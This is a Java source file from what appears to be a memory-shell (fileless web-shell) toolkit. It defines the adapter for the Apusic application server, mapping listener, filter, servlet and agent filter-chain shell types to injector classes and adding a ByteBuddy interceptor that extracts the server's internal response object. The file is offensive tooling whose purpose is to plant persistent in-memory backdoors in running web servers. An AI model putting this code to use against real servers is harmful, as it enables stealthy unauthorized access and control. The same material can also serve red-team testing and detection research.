package com.reajason.javaweb.memshell.server.apusic;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class Apusic extends AbstractServer {

    public static class ListenerInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "http"), "response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.apusic.ApusicListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.apusic.ApusicFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.apusic.ApusicServletInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.apusic.ApusicFilterChainAgentInjector")
                .build();
    }
}
